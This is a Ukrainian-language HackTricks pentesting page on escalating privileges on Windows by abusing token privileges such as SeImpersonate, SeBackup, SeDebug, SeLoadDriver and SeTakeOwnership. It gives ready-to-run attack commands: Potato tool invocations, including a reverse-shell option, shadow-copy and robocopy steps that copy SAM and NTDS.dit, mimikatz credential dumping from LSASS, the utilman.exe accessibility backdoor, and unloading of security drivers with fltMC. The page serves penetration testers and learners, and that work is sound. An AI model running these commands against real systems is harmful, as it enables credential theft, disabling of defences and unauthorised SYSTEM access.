# Зловживання токенами

{{#include ../../banners/hacktricks-training.md}}

## Токени

Якщо ви **не знаєте, що таке Windows Access Tokens**, прочитайте цю сторінку, перш ніж продовжувати:


{{#ref}}
access-tokens.md
{{#endref}}

**Можливо, ви зможете підвищити привілеї, зловживаючи токенами, які вже маєте.**

### SeImpersonatePrivilege

Цей привілей дає процесу змогу видати себе за інший (але не створити токен), якщо він може отримати дескриптор цього токена. Привілейований токен можна отримати від служби Windows (DCOM), спонукавши її автентифікуватися за допомогою NTLM на адресу експлойта, після чого можна запустити процес із привілеями SYSTEM.<sup>[[2]](#references)</sup> Цей примітив можна використати за допомогою таких інструментів, як [JuicyPotato](https://github.com/ohpe/juicy-potato), [RogueWinRM](https://github.com/antonioCoco/RogueWinRM) (для якого потрібно, щоб WinRM було вимкнено), [SweetPotato](https://github.com/CCob/SweetPotato) і [PrintSpoofer](https://github.com/itm4n/PrintSpoofer).

Вебзастосунок, доступний лише через loopback, може стати окремим напрямом для примушення до автентифікації, якщо локальний користувач може звернутися до автентифікованої кінцевої точки, яка надсилає запит до URL-адреси, вибраної користувачем, від імені облікового запису з вищими привілеями. Перевірте авторизацію кінцевої точки та обмеження для URL-адрес, фактичну ідентичність вихідного клієнта та його поведінку під час автентифікації, а також те, чи може цей клієнт звернутися до слухача під контролем користувача з нижчими привілеями. Наявність увімкненого `SeImpersonatePrivilege`, слухача IIS або параметра для отримання вмісту за URL-адресою сама по собі не підтверджує наявність привілейованого токена чи шляху до підвищення привілеїв. Проводьте цю перевірку пасивно; не надсилайте запити для примушення до автентифікації під час розвідки. Див. документацію Microsoft про [імперсонацію клієнта](https://learn.microsoft.com/en-us/windows/win32/secauthz/client-impersonation) та [ідентичність пулу застосунків IIS](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities).

Сучасні нотатки для операторів:

- **JuicyPotato — застарілий інструмент**: у Windows 10 1809+/Server 2019+ віддавайте перевагу **GodPotato**, **SigmaPotato**, **PrintNotifyPotato**, **RoguePotato**, **SharpEfsPotato/EfsPotato** або **PrintSpoofer** — залежно від того, які RPC/COM-інтерфейси ще доступні.
- Якщо ви скомпрометували службу, що працює від імені **`LOCAL SERVICE`** або **`NETWORK SERVICE`**, і `whoami /priv` показує **відфільтрований токен** без `SeImpersonatePrivilege`/`SeAssignPrimaryTokenPrivilege`, спершу відновіть **набір привілеїв за замовчуванням** для облікового запису (наприклад, за допомогою **FullPowers**), а потім знову спробуйте інструменти сімейства potato.<sup>[[3]](#references)</sup>
- Деякі новіші форки зручніші для операторів, ніж оригінальні інструменти. Наприклад, **SigmaPotato** підтримує reflection/виконання в пам’яті та сумісність із сучасними версіями Windows, а **PrintNotifyPotato** зловживає COM-службою PrintNotify і часто стає в пригоді, коли класичний шлях через Spooler вимкнено.

```cmd
FullPowers.exe -c "cmd /c whoami /priv" -z
GodPotato.exe -cmd "cmd /c whoami"
SigmaPotato.exe --revshell <ip> <port>
PrintNotifyPotato.exe whoami
```


{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}


{{#ref}}
juicypotato.md
{{#endref}}

### SeAssignPrimaryPrivilege

Це дуже схоже на **SeImpersonatePrivilege**: для отримання привілейованого токена використовується **той самий метод**.\
Цей привілей дає змогу **призначити первинний токен** новому або призупиненому процесу. За допомогою привілейованого токена імперсоніфікації можна створити первинний токен (DuplicateTokenEx).\
Маючи токен, можна створити **новий процес** за допомогою 'CreateProcessAsUser' або створити призупинений процес і **встановити йому токен** (зазвичай змінити первинний токен запущеного процесу не можна).<sup>[[2]](#references)</sup>

### SeTcbPrivilege

Якщо цей токен увімкнено, можна використовувати **KERB_S4U_LOGON**, щоб отримати **токен імперсоніфікації** будь-якого іншого користувача без знання облікових даних, **додати до токена довільну групу** (admins), встановити для токена **рівень цілісності** "**medium**" і призначити цей токен **поточному потоку** (SetThreadToken).<sup>[[2]](#references)</sup>

### SeBackupPrivilege

Цей привілей змушує систему **надавати повний доступ на читання** будь-якого файла (лише для операцій читання). Його використовують для **читання хешів паролів локальних облікових записів Administrator** із реєстру, після чого для роботи з хешем можна скористатися такими інструментами, як "**psexec**" або "**wmiexec**" (техніка Pass-the-Hash). Однак ця техніка не працює за двох умов: коли обліковий запис Local Administrator вимкнено або коли діє політика, що вилучає адміністративні права в Local Administrators, які підключаються віддалено.<sup>[[2]](#references)</sup>\
На практиці найнадійніший вбудований підхід зазвичай такий: **VSS + `robocopy /b`**: створити або відкрити тіньову копію, а потім скопіювати `SAM`/`SYSTEM` або `NTDS.dit` у **режимі резервного копіювання**, що дає змогу обійти ACL файлів.<sup>[[4]](#references)</sup>

```cmd
:: shadow.txt
set context persistent nowriters
add volume c: alias tk
create
expose %tk% z:

:: then copy sensitive files from the snapshot
diskshadow /s shadow.txt
robocopy /b z:\Windows\System32\Config C:\temp SAM SYSTEM SECURITY
robocopy /b z:\Windows\NTDS C:\temp ntds.dit
```

You can **зловживати цим привілеєм** за допомогою:

- [https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1)
- [https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug)
- переглянувши відео **IppSec**: [https://www.youtube.com/watch?v=IfCysW0Od8w\&t=2610\&ab_channel=IppSec](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610&ab_channel=IppSec)
- або, як пояснено в розділі **підвищення привілеїв за допомогою Backup Operators**:

{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### SeRestorePrivilege

Цей привілей надає дозвіл на **доступ для запису** до будь-якого системного файлу незалежно від його списку контролю доступу (ACL). Це відкриває численні можливості для підвищення привілеїв, зокрема **модифікацію служб**, DLL Hijacking і налаштування **debuggers** за допомогою Image File Execution Options, а також застосування багатьох інших технік.<sup>[[2]](#references)</sup>

### SeCreateTokenPrivilege

SeCreateTokenPrivilege — це потужний дозвіл, особливо корисний, коли користувач може імперсонувати токени, але також і за відсутності SeImpersonatePrivilege. Ця можливість ґрунтується на здатності імперсонувати токен, який представляє того самого користувача, а рівень цілісності якого не перевищує рівень цілісності поточного процесу.<sup>[[2]](#references)</sup>

**Ключові моменти:**

- **Імперсонація без SeImpersonatePrivilege:** За певних умов SeCreateTokenPrivilege можна використати для EoP, імперсонуючи токени.
- **Умови імперсонації токена:** Для успішної імперсонації цільовий токен має належати тому самому користувачу, а його рівень цілісності має бути не вищим за рівень цілісності процесу, який виконує імперсонацію.
- **Створення та модифікація токенів імперсонації:** Користувачі можуть створити токен імперсонації та розширити його, додавши SID (Security Identifier) привілейованої групи.

### SeLoadDriverPrivilege

Цей привілей дає змогу процесу **завантажувати та вивантажувати драйвери пристроїв**, створивши запис реєстру з певними значеннями `ImagePath` і `Type`. Оскільки прямий доступ для запису до `HKLM` (HKEY_LOCAL_MACHINE) обмежено, натомість можна використати `HKCU` (HKEY_CURRENT_USER). Однак потрібен певний шлях, щоб ядро розпізнало запис `HKCU` як конфігурацію драйвера.<sup>[[2]](#references)</sup>

У сучасних атаках зазвичай застосовують **BYOVD** (bring your own vulnerable driver): завантажують **підписаний, але вразливий** драйвер ядра, а потім використовують його IOCTL, щоб вимкнути засоби захисту або отримати виконання коду в ядрі. Варто враховувати, що в новіших збірках Windows 11/Server **список заблокованих вразливих драйверів Microsoft** та/або **HVCI/Memory Integrity** часто порушують роботу старіших загальнодоступних ланцюжків атак, тож класичні приклади на кшталт `szkg64.sys` більше не є універсально надійними.

Шлях має вигляд `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName`, де `<RID>` — це відносний ідентифікатор поточного користувача. У `HKCU` потрібно створити весь цей шлях і задати два значення:<sup>[[2]](#references)</sup>

- `ImagePath` — шлях до бінарного файлу, який потрібно виконати
- `Type` зі значенням `SERVICE_KERNEL_DRIVER` (`0x00000001`).

**Порядок дій:**

1. Використайте `HKCU` замість `HKLM` через обмежений доступ для запису.
2. Створіть у `HKCU` шлях `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName`, де `<RID>` — відносний ідентифікатор поточного користувача.
3. Задайте для `ImagePath` шлях до виконуваного бінарного файлу.
4. Призначте `Type` значення `SERVICE_KERNEL_DRIVER` (`0x00000001`).

```python
# Example Python code to set the registry values
import winreg as reg

# Define the path and values
path = r'Software\YourPath\System\CurrentControlSet\Services\DriverName' # Adjust 'YourPath' as needed
key = reg.OpenKey(reg.HKEY_CURRENT_USER, path, 0, reg.KEY_WRITE)
reg.SetValueEx(key, "ImagePath", 0, reg.REG_SZ, "path_to_binary")
reg.SetValueEx(key, "Type", 0, reg.REG_DWORD, 0x00000001)
reg.CloseKey(key)
```

Більше способів зловживання цією привілеєю описано тут: [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege)

### SeTakeOwnershipPrivilege

Це схоже на **SeRestorePrivilege**. Його основна функція дає змогу процесу **стати власником об'єкта**, обходячи вимогу явного дискреційного доступу завдяки наданню прав доступу WRITE_OWNER. Процес передбачає спочатку отримання права власності на потрібний ключ реєстру для запису, а потім зміну DACL, щоб дозволити операції запису.<sup>[[2]](#references)</sup>

```bash
takeown /f 'C:\some\file.txt' #Now the file is owned by you
icacls 'C:\some\file.txt' /grant <your_username>:F #Now you have full access
# Use this with files that might contain credentials such as
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
c:\inetpub\wwwwroot\web.config
```

### SeDebugPrivilege

Цей привілей дозволяє **налагоджувати інші процеси**, зокрема читати й записувати дані в пам’яті. З цим привілеєм можна застосовувати різні стратегії memory injection, здатні обходити більшість антивірусних рішень і систем запобігання вторгненням на хості.<sup>[[2]](#references)</sup>

У сучасних версіях Windows пам’ятайте, що `SeDebugPrivilege` зазвичай достатньо, щоб відкрити **незахищені процеси SYSTEM** і клонувати їхні токени, але це **не** гарантує, що ви зможете отримати доступ до **LSASS**. Якщо ввімкнено **RunAsPPL / LSA Protection**, незахищені процеси не можуть читати дані LSASS або виконувати в нього ін’єкції, навіть за наявності `SeDebugPrivilege`. У такому разі викрадіть токен з іншого процесу SYSTEM, який не захищений PPL, або використайте PPL bypass/BYOVD, а не виходьте з припущення, що `procdump` спрацює. Приклад повного копіювання токена за допомогою `SeDebugPrivilege` + `SeImpersonatePrivilege` дивіться на [цій сторінці](sedebug-+-seimpersonate-copy-token.md).

#### Дамп пам’яті

Для **збереження дампу пам’яті процесу** можна скористатися [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) із [SysInternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite). Зокрема, цей спосіб можна застосувати до процесу **Local Security Authority Subsystem Service (**[**LSASS**](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)**)**, який відповідає за зберігання облікових даних користувача після успішного входу користувача в систему.

Потім цей дамп можна завантажити в mimikatz, щоб отримати паролі:

```
mimikatz.exe
mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

Раніше збережений читабельний дамп LSASS може бути доступний, навіть якщо поточний обліковий запис не має дозволу на зняття дампу з живого захищеного процесу. Розглядайте файл дампу або архів зі схожою назвою лише як зачіпку: перевірте доступ і вміст, а потім з’ясуйте, чи досі дійсні відновлені облікові дані та чи надають вони контекст із вищими привілеями. Самі лише назви файлів не доводять, що архів містить дамп або що облікові дані можна повторно використати.

#### RCE

Якщо ви хочете отримати оболонку `NT SYSTEM`, можете скористатися:

- [**SeDebugPrivilege-Exploit (C++)**](https://github.com/bruno-1337/SeDebugPrivilege-Exploit)
- [**SeDebugPrivilegePoC (C#)**](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC)
- [**psgetsys.ps1 (Powershell Script)**](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1)

```bash
# Get the PID of a process running as NT SYSTEM
import-module psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>)
```

### SeManageVolumePrivilege

Це право (виконання завдань з обслуговування томів) може надавати змогу виконувати привілейовані операції з томами, але саме по собі не гарантує доступу до дескриптора необробленого тому для читання чи довільного доступу до файлів. Важливими залишаються ACL пристроїв, стан токена, версія Windows і запитувана операція. Дозволена операція керування томом натомість може змінити ACL файлової системи; це операція зі зміною даних, яка потенційно впливає на весь том. На хості CA для зловживання сертифікатами також потрібен доступ до придатного матеріалу приватного ключа, а для доступу до файлів, захищених EFS, усе одно потрібен авторизований ключ розшифрування або відновлення. Докладні передумови наведено нижче.<sup>[[5]](#references)</sup>

Докладні техніки та способи захисту:

{{#ref}}
semanagevolume-perform-volume-maintenance-tasks.md
{{#endref}}

## Перевірка привілеїв

```
whoami /priv
```

Токени, що відображаються як Disabled, зазвичай можна ввімкнути, тож часто можна зловживати як привілеями _Enabled_, так і _Disabled_.

### Увімкнення всіх tokens

Якщо у вас є вимкнені привілеї, ви можете скористатися скриптом [**EnableAllTokenPrivs.ps1**](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1), щоб увімкнути всі tokens:

```bash
.\EnableAllTokenPrivs.ps1
whoami /priv
```

Або **скрипт**, вбудований у цей [**допис**](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/).

## Table

Повна шпаргалка з привілеїв токенів доступна за посиланням [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin); у наведеному нижче огляді перелічено лише прямі способи скористатися привілеєм, щоб отримати сеанс адміністратора або прочитати конфіденційні файли.<sup>[[1]](#references)</sup>

| Привілей                   | Вплив       | Інструмент             | Шлях виконання                                                                                                                                                                                                                                                                                                                                       | Примітки                                                                                                                                                                                                                                                                                                                       |
| -------------------------- | ----------- | ---------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **`SeAssignPrimaryToken`** | _**Адміністратор**_ | сторонній інструмент | _"Він дасть користувачу змогу імперсонувати токени та підвищити привілеї до рівня nt system за допомогою таких інструментів, як potato.exe, rottenpotato.exe і juicypotato.exe"_                                                                                                                                                                      | Дякую [Aurélien Chalot](https://twitter.com/Defte_) за оновлення. Незабаром спробую переформулювати це як інструкцію з конкретними кроками.                                                                                                                                                                                   |
| **`SeBackup`**             | **Загроза** | _**Вбудовані команди**_ | Читання конфіденційних файлів за допомогою `robocopy /b` або спеціальних засобів копіювання з підтримкою SeBackup.                                                                                                                                                                                                                                  | <p>- Чудово підходить для `SAM`/`SYSTEM`, `SECURITY`, `NTDS.dit` і, часом, `%WINDIR%\MEMORY.DMP`.<br><br>- `robocopy` зручний, але спеціальні командлети/API SeBackup часто гнучкіші для відкритих файлів або файлів, заблокованих для доступу.</p>                                                                            |
| **`SeCreateToken`**        | _**Адміністратор**_ | сторонній інструмент | Створення довільного токена, зокрема з правами локального адміністратора, за допомогою `NtCreateToken`.                                                                                                                                                                                                                                            |                                                                                                                                                                                                                                                                                                                                |
| **`SeDebug`**              | _**Адміністратор**_ | **PowerShell**         | Дублювання токена SYSTEM, що **не є PPL**, або дамп пам’яті незахищеного процесу.                                                                                                                                                                                                                                                                   | <p>Створення дампу LSASS зазвичай блокується, якщо ввімкнено RunAsPPL/LSA Protection.</p><p>Скрипт доступний на [FuzzySecurity](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1)</p>                                                                                                         |
| **`SeImpersonate`**        | _**Адміністратор**_ | сторонній інструмент | Використання **сімейства Potato** / імперсонації через іменований канал для запуску процесу від імені SYSTEM (`PrintSpoofer`, `RoguePotato`, `GodPotato`, `SigmaPotato`, `PrintNotifyPotato` тощо).                                                                                                                                                  | <p>Найпрактичніше використовувати з облікових записів служб, як-от IIS APPPOOL, MSSQL, заплановані завдання, або в будь-якому контексті, який уже має `SeImpersonatePrivilege`.</p>                                                                                                                                             |
| **`SeLoadDriver`**         | _**Адміністратор**_ | сторонній інструмент | <p>1. Завантажити підписаний, але вразливий драйвер ядра (BYOVD)<br>2. Використати IOCTL драйвера, щоб отримати доступ на читання/запис до ядра, вимкнути засоби безпеки або підвищити привілеї до SYSTEM<br><br>Крім того, цей привілей можна використати для вивантаження драйверів, пов’язаних із безпекою, за допомогою вбудованої команди <code>fltMC</code>, наприклад <code>fltMC sysmondrv</code></p> | <p>Старіші загальнодоступні драйвери, як-от <code>szkg64.sys</code>, дедалі частіше блокуються в сучасних версіях Windows списком заблокованих вразливих драйверів / HVCI.</p>                                                                                                                                                |
| **`SeRestore`**            | _**Адміністратор**_ | **PowerShell**         | <p>1. Запустити PowerShell/ISE із наявним привілеєм SeRestore.<br>2. Увімкнути привілей за допомогою <a href="https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1">Enable-SeRestorePrivilege</a>).<br>3. Перейменувати utilman.exe на utilman.old<br>4. Перейменувати cmd.exe на utilman.exe<br>5. Заблокувати консоль і натиснути Win+U</p> | <p>Деякі антивірусні програми можуть виявити атаку.</p><p>Альтернативний метод передбачає заміну двійкових файлів служб, що зберігаються в "Program Files", за допомогою того самого привілею</p>                                                                                                                             |
| **`SeTakeOwnership`**      | _**Адміністратор**_ | _**Вбудовані команди**_ | <p>1. <code>takeown.exe /f "%windir%\system32"</code><br>2. <code>icacls.exe "%windir%\system32" /grant "%username%":F</code><br>3. Перейменувати cmd.exe на utilman.exe<br>4. Заблокувати консоль і натиснути Win+U</p>                                                                                                                                | <p>Деякі антивірусні програми можуть виявити атаку.</p><p>Альтернативний метод передбачає заміну двійкових файлів служб, що зберігаються в "Program Files", за допомогою того самого привілею.</p>                                                                                                                             |
| **`SeTcb`**                | _**Адміністратор**_ | сторонній інструмент | <p>Маніпуляція токенами для отримання прав локального адміністратора. Може знадобитися SeImpersonate.</p><p>Потребує перевірки.</p>                                                                                                                                                                                                                  |                                                                                                                                                                                                                                                                                                                                |

## References

- [1] [gtworek/Priv2Admin — шляхи експлуатації від привілеїв Windows до прав адміністратора](https://github.com/gtworek/Priv2Admin)
- [2] [Зловживання привілеями токенів для LPE](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt)
- [3] [itm4n — Поверніть мені мої привілеї! Будь ласка?](https://itm4n.github.io/localservice-privileges/)
- [4] [Microsoft — Robocopy (режим резервного копіювання `/b` обходить перевірки ACL для файлів і папок)](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [5] [Microsoft — Виконання завдань з обслуговування томів (SeManageVolumePrivilege)](https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/perform-volume-maintenance-tasks)
- [6] [0xdf — HTB: Certificate (SeManageVolumePrivilege → викрадення ключа CA → Golden Certificate)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)
{{#include ../../banners/hacktricks-training.md}}
